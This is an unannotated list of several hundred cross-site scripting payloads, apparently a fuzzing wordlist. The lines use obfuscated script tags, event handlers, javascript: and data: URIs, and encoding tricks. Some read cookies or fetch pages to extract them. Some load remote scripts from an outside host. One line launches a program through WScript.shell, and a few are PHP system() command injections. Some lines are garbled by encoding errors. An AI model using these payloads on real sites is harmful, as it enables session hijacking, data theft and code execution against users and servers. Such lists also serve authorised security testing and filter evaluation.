<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{confirm%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); confirm(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
<a"'%0A`= +%20>;test<a"'%0A`= +%20>?test<a"'%0A`= +%20>;#test<a"'%0A`= +%20>;
<a"'%0A`= +%20>;test<a"'%0A`= +%20>?test<a"'%0A`= +%20>;&x="><img src=x onerror=prompt(1);>#"><img src=x onerror=prompt(1);>test<a"'%0A`= +%20>;
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
about://xss.cx
<a/href[\0C]=ja&Tab;vasc&Tab;ript&colon;confirm(1)>XXX</a>
<a/href=data&colon;text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==>ClickMe</a>
<a$href="data:text/html,%style=""3cscript>confirm((1)</sstyle=""cript>" onerror=>hello
<a/href=java&Tab;script:confirm%28/XSS/%29>click</a>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6 C\x65\x72\x74\x28\x30\x29\x3B'>xss
<a[\x0B]onmosemove=confirm('\Done\')>
<a[\x0B]onmouseover=location=â€™jav\x41script\x3aconfirm\x28â€³ZDresearchâ€\x29â€²>ZDresearch
<body language=vbs onload=confirm-1
<body language=vbs onload=confirm-1
<body language=vbs onload=confirm-1
"><body language=vbs onload=window.location='http://xss.cx'>
<body onload='vbs:Set x=CreateObject("Msxml2.XMLHTTP"):x.open"GET",".":x.send:MsgBox(x.responseText)'>
<body scroll=confirm(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<body/onload=&lt;!--&gt;&#10confirm(1)>
<body/onload=&lt;!--&gt;&#10confirm(1)>
"<body/onload=&lt;!--&gt;&#10confirm(1);prompt(/XSS/.source)>"
"\"><body/onload=&lt;!--&gt;&#10confirm(1);prompt(/XSS/.source)>",
<body/onload=&lt;!--&gt;&#10confirm(1);prompt(/XSS/.source)>
><body/onload=&lt;!--&gt;&#10confirm(1);prompt(/XSS/.source)>
<button autofocus onfocus=confirm(2)>
<button onclick="window.open('http://xss.cx/::Error138 ');">CLICKME
"<button>'><img src=x onerror=confirm(0);></button>"
<button>'><img src=x onerror=confirm(0);></button>
charset=utf-
'`"><*chr*script>log(*num*)</script>
<command onmouseover="javascript:confirm(0);">Save //
<*datahtmlelements* data=about:blank background=about:blank action=about:blank type=image/gif src=about:blank href=about:blank *dataevents*="customLog('*datahtmlelements* *dataevents*')"></*datahtmlelements*>
<*datahtmlelements* *dataevents*="javascript:parent.customLog('*datahtmlelements* *dataevents*')"></*datahtmlelements*>
<*datahtmlelements* *datahtmlattributes*="javascript:parent.customLog('*datahtmlelements* *datahtmlattributes*')"></*datahtmlelements*>
<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="confirm(1)">x</button>?f
<div contextmenu=x>right-click<menu id=x onshow=confirm(1)> 
<div id="confirm(2)" style="x:expression(eval)(id)">
<div onmouseover='confirm&lpar;1&rpar;'>DIV</div>
<div onmouseover='confirm&lpar;1&rpar;'>DIV</div>
<div style="color:rgb(''&#0;x:expression(confirm(URL=1))"></div>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="confirm(1)">x</button>
<%div%20style=xss:expression(prompt(1))>
<div/onmouseover='confirm(1)'> style="x:">
<div/onmouseover='confirm(1)'> style="x:">
<div/style=content:url(data:image/svg+xml);visibility:visible onmouseover=confirm(1)>Mouse Over</div>
<div/style="width:expression(confirm(1))">X</div>
<embed code="http://xss.cx/xss.swf" allowscriptaccess=always></embed>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.cx/xss.js></SCRIPT>'"-->
exp/*<XSS STYLE='no\xss:noxss("*//*");
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
for(i=10;i>1;i--)confirm(i);new ActiveXObject("WScript.shell").Run('calc.exe',1,true);
<form action='data:text&sol;html,&lt;script&gt;confirm(1)&lt/script&gt'><button>CLICK
<form action='java&Tab;scri&Tab;pt:confirm(1)'><button>CLICK
<form action="javas&Tab;cript:confirm(1)" method="get"><input type="submit" value="Submit"></form>   
<form id="myform" value="" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>confirm(1)</textarea><input type="submit" value="Absenden"></form>
<form name=location >
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
<form/action=javascript&#x0003A;eval(setTimeout(confirm(1)))><input/type=submit>
//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>//
<form><button formaction=javascript&colon;confirm(1)>CLICKME
<form><iframe &#09;&#10;&#11; src="javascript&#58;confirm(1)"&#11;&#10;&#09;;>
<form><input type=submit formaction=//xss.cx><textarea name=x>
<form><isindex formaction="javascript&colon;confirm(1)"
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<frameset><frame/src=//xss.cx> 
&gt
&gt;
http://www.google<script .com>confirm(document.location)</script
http://www.<script abc>setTimeout('confirm(1)',1)</script .com>
http://www.<script>confirm(1)</script .com
<!--[if WindowsEdition]><script>confirm(location);</script><![endif]-->
<!--[if<img src=x:x onerror=confirm(5)//]-->
<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); confirm(Safe.get());</script>
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Bconfirm%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
<iframe src="" onmouseover="confirm(document.cookie)">
<iframe src="#" style=width:exp/**/ressi/**/on(confirm(1))>
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){confirm(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){confirm(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){confirm(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){confirm(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src="data:D,<script>confirm(top.document.body.innerHTML)</script>">
<iframe src="data:message/rfc822,Content-Type: text/html;%0aContent-Transfer-Encoding: quoted-printable%0a%0a=3CSCRIPT=3Econfirm(document.location)=3C/SCRIPT=3E"></iframe>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe srcdoc='&lt;svg/onload=confirm(3)&gt;'>
<iframe srcdoc="<svg/onload=confirm(domain)>">
<iframe src="http://xss.cx?x=<iframe name=x></iframe>"></iframe><a href="http://xss.ms" target=x id=x></a><script>window.onload=function(){x.click()}</script>
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){confirm(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe src=javascript&colon;confirm&lpar;document&period;location&rpar;>
<iframe src="javascript:'<script src=http://xss.cx ></script>'"></iframe>
"><iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe width=0 height=0 src="javascript:confirm(1)">
<iframe/%00/ src=javaSCRIPT&colon;confirm(1)
"><iframe%20src="http://google.com"%%203E
iframe.contentWindow.location.constructor.prototype
<iframe><iframe src=javascript:confirm(4)></iframe>
<iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";>
<iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";> 
"><iframe/onreadystatechange=confirm(1)
<iframe/onreadystatechange=confirm(1)
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
"><iframe/src \/\/onload = prompt(1)
<iframe/src \/\/onload = prompt(1)
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe/src="data:text/html,<svg &#111;&#110;load=confirm(1)>">
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
<iframe/src=j&Tab;av&Tab;as&Tab;cri&Tab;pt&Tab;:co&Tab;nfir&Tab;m&Tab;(&Tab;&Tab;1&Tab;)>
<iframe/src='javascript:if(null==null){javascript:0?1:confirm(1);}'>
<iframe/src='javascript:if(null==null){javascript:0?1:confirm(1);}'>
<!--[if]><script>confirm(1)</script -->
<img language=vbs src=<b onerror=confirm#1/1#>  
"><img src="/" =_=" title="onerror='prompt(1)'">
<img src="/" =_=" title="onerror='prompt(1)'">
<img src ?itworksonchrome?\/onerror = confirm(1)
<img src ?itworksonchrome?\/onerror = confirm(1)???
â€œ><img src= onerror=confirm(1)>
<img src=//\ onload=confirm(1)>
<img src=`%00`&NewLine; onerror=confirm(1)&NewLine;
<img src=1 onerror=Function("aler"+"t(documen"+"t.domain)")()>
"]<img src=1 onerror=confirm(1)>
/#<img src=1 onerror=javascript:confirm(3)>
<img src=a onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,67,104,101,97,116,115,111,110,39,41))>
<img src=http://www.google.fr/images/srpr/logo3w.png onload=confirm(this.ownerDocument.cookie) width=0 height= 0 /> #
"><img src=javascript:while([{}]);>
<img src=javascript:while([{}]);>
<img/ src//'onerror/''/=confirm(1)//'>
<img src=test.jpg?value=">Yes, we are still inside a tag!">
<img src=x on*chr*Error="javascript:log(*num*)"/>
<img src=x on*chr*Error="javascript:log(*num*)"/>
<img src=x onerror=URL='javascript:confirm(1)'>
"\"><img src=\"x\" onerror=\"confirm(0)\"/>",
><img src=\"x\" onerror=\"confirm(0)\"/>
<img src=x onerror='confirm(domain+/ -- /+cookie)'>">
<img src=x onerror='confirm(domain+/ -- /+cookie)'>">
"><img src=x onerror=confirm('x') />]
"><img src=x onerror=confirm(1); ...
"><img src=x onerror=prompt(1);>
"><img src=x onerror=prompt(document.location);>#"><img src=x onerror=prompt(document.location);>
"><img src=x onerror=prompt("xss");>#"><img src=x onerror=prompt("xss");>
"><img src=x onerror=window.open('https://www.google.com/');>
"<img src=x onerror=x.onerror=confirm(1);prompt(2);confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83))>"
"\"><img src=x onerror=x.onerror=confirm(1);prompt(2);confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
<img src=x onerror=x.onerror=confirm(1);prompt(2);confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83))>
><img src=x onerror=x.onerror=confirm(1);prompt(2);confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83))>
"<img src=x onerror=x.onerror=m='%22%3E%3Cimg%20src%3Dx%20onerror%3Dx.onerror%3Dprompt%28/xss/.source%29%3E';d=unescape(m);document.write(d);prompt(String.fromCharCode(88,83,83))>"
<img src=x onerror=x.onerror=m='%22%3E%3Cimg%20src%3Dx%20onerror%3Dx.onerror%3Dprompt%28/xss/.source%29%3E';d=unescape(m);document.write(d);prompt(String.fromCharCode(88,83,83))>
"/><img src=x onerror=x.onerror=prompt(0)>
"\"/><img src=x onerror=x.onerror=prompt(0)>"
"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);confirm(1)>
"\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);confirm(1)>"
<![<img src=x:x onerror=`confirm(2)//`]-->
<img src=xx: onerror=confirm(document.location)>
"><img src="xx:x" alt="``onerror=confirm(1)"><script>document.body.innerHTML+=''</script>
<img src="xx:x" alt="``onerror=confirm(1)"><script>document.body.innerHTML+=''</script>
"<img src=`xx:xx` onerror=confirm(/XSS/.source);confirm(1)>"
"\"><img src=`xx:xx` onerror=confirm(/XSS/.source);confirm(1)>",
<img src=`xx:xx` onerror=confirm(/XSS/.source);confirm(1)>
><img src=`xx:xx` onerror=confirm(/XSS/.source);confirm(1)>
<img src=xx:xx onerror=window[['logChr*chr*']](*num*)>
<img src=`xx:xx`onerror=confirm(1)>
<img src=`xx:xx`onerror=confirm(1)>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;confirm(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
"<img/src=` onerror=confirm(1)>"
<img/src=` onerror=confirm(1)>
"><--`<img/src=` onerror=confirm(1)> --!>
<--`<img/src=` onerror=confirm(1)> --!>
<img/src=%00 id=confirm(1) onerror=eval(id)
<img/src=`%00` /id=confirm(1) /onerror=eval(id)
<img/src=`%00` onerror=this.onerror=confirm(1) 
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
<img/src=x alt=confirm(1) onmouseover=eval(alt)>
<img/src=x alt=confirm(1) onmouseover=eval(alt)>
"\"><imgsrc=x onerror=confirm.onerror=confirm(1)>",
><imgsrc=x onerror=confirm.onerror=confirm(1)>
<img/src="x"/id="javascript"/name=":confirm"/alt="(1)"/onerror="eval(id + name + alt)">
=â€™â€><img/src=â€xâ€onerror=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,108,83,116,111,114,97,103,101,46,115,101,116,73,116,101,109,40,39,105,100,39,44,39,34,62,60,105,109,103,47,115,114,99,61,92,34,120,92,34,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62,39,41))>
'><img/src="x:x"/onerror="confirm(1)"'><
innerHTML=document.title
innerHTML=innerText
<input autofocus onfocus=confirm(1)>
<input formaction=JaVaScript:confirm(document.cookie)>
<input id=x><input id=x><script>confirm(x)</script>
<><input onfocus=confirm(0) autofocus <!--
<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaa!>
<input type=hidden onformchange=confirm(1)/>
<input type=hidden style=`x:expression(confirm(1))`>
<input type=hidden style=`x:expression(confirm(4))`>
<input type="text" name="a"
<input type="text" value=`` <div/onmouseover='confirm(1)'>X</div>
<input type="text" value=``<div/onmouseover='confirm(1)'>X</div>
"><input value=<><iframe/src=javascript:confirm(1)
<input value=<><iframe/src=javascript:confirm(1)
input1=<script/&in%u2119ut1=>al%u0117rt('1')</script>
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<i/onclick=URL=name>
"/><isindex action="javas&Tab;cript:confirm(1)" type=image>
"><isindex action="javas&Tab;cript:confirm(1)" type=image>
<isindex action="javas&Tab;cript:confirm(1)" type=image> 
<isindex action="javas&Tab;cript:confirm(document.cookie)" type=image>
<isindex formaction=javascript:confirm(1)>
<label class="<% confirm(1) %>">
<li style="color:rgb(''0,0,&#0;javascript:expression(confirm(1))">XSS</li>
<link rel="import" href="//xss.cx">
<link rel=import onerror=confirm(1)>
<link rel="prefetch" href="http://xss.cx">
<link rel=stylesheet href='data:,+/v8*%7bx:e+AHgAcA-ression(confirm(1))%7D' >
<link%20rel="import"%20href="?bypass=<script>confirm(document.domain)</script>">
<listing>&ltimg src=x onerror=confirm(1)&gt</listing>
&lt
&lt;
&lt;a href="http://i.imgur.com/b7sajuK.jpg" download&gt;<a href="http://i.imgur.com/b7sajuK.jpg" download>What a cute kitty!</a>&lt;/a&gt;
&lt;img src=xx:x onerror=confirm(1)&gt;<script>document.body.innerHTML=document.body.innerText||document.body.textContent</script>
&lt;label class="&lt;% confirm(1) %&gt;"&gt;
&lt;/script&gt;&lt;script&gt;confirm(1)&lt;/script&gt;
<marquee onstart='javascript:confirm&#x28;1&#x29;'>^__^
"><marquee>confirm( `bypass :)`)</marquee>
"<marquee/onstart=confirm(/XSS/.source);confirm(1)>"
"\"><marquee/onstart=confirm(/XSS/.source);confirm(1)>",
<marquee/onstart=confirm(/XSS/.source);confirm(1)>
><marquee/onstart=confirm(/XSS/.source);confirm(1)>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a/xlink:href=javascript&colon;confirm&lpar;1&rpar;>click
<math><a/xlink:href=javascript:eval('\141\154\145\162\164\50\61\51')>X
<meta charset="x-mac-farsi">Ã‚Â¼script Ã‚Â¾confirm(1)//Ã‚Â¼/script Ã‚Â¾
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; confirm(1)" http-equiv="refresh"/>
<meta http-equiv=refresh content="0 javascript:confirm(1)">
"><meta http-equiv="refresh" content="0;javascript&colon;confirm(1)"/>
<meta http-equiv="refresh" content="0;javascript&colon;confirm(1)"/>
<meta http-equiv="refresh" content="0;javascript&colon;confirm(1)"/>?
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<meta http-equiv=refresh content=+.1,javascript:confirm(document.cookie)>
?movieName=";]);}catch(e){}if(!self.a)self.a=!confirm(document.domain);//
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
"\"\/><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"
><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"
<object data='data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>'>
"><object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
"/><object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
"/><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>
"<object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>"
"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
<object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>
"/><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"///><img id="b1" src=1 onerror='$.getScript("http://xss.cx.js", function() { c(); });'>'
"<option>'><button><img src=x onerror=confirm(0);></button></option>"
<option>'><button><img src=x onerror=confirm(0);></button></option>
"\"\/><option>'><button><img src=x onerror=confirm(1);></button></option>",
><option>'><button><img src=x onerror=confirm(1);></button></option>
<p hidden?={{hidden}}>123</p> 
<p style="font-family:'foo&amp;#x5c;27&amp;#x5c;3bx:expr&amp;#x65;ession(confirm(1))'">
?param1=<script>prompt(9);/*&param2=*/</script>
$.parseHTML('<img src=xx:X onerror=confirm(1)>')
<?php echo $_SERVER['PHP_SELF']?>
</plaintext\></|\><plaintext/onmouseover=prompt(1)
?playerID=a\";))}catch(e){confirm(document.domain)}//
${@print(system($_SERVER['HTTP_USER_AGENT']))}
${@print(system(â€œwhoamiâ€))}
<q/oncut=confirm()
'/><q/oncut=open()>//
<q/oncut=open()>
>&quot;&gt;&lt;script&gt;confirm(&#039;hi&#039;)&lt;/script&gt;&quot;&lt;</a>value=""><script>confirm('hi')</script>"<"/>
.replace(/.+/,eval)//
<s "'"="" 000="">
"'"><s/000 "'"><s/000
"'"><s/000 "'"><s/000 
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
<s[NULL]cript>confirm(1)</s[NULL]cript>'>Clickme</a>
<sVg><scRipt %00>confirm&lpar;1&rpar;
<<scr\0ipt/src=http://xss.cx/xss.js></script
<scri%00ipt>confirm(0);</script>
<scri%00pt>confirm(1);</scri%00pt>
"<scri%00pt>confirm(0);</scri%00pt>"
"\"><scri%00pt>confirm(0);</scri%00pt>",
<scri%00pt>confirm(0);</scri%00pt>
><scri%00pt>confirm(0);</scri%00pt>
<script>/*     */confirm(1)/*     */</script>
<script>     function b() { return Safe.get(); } confirm(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> 
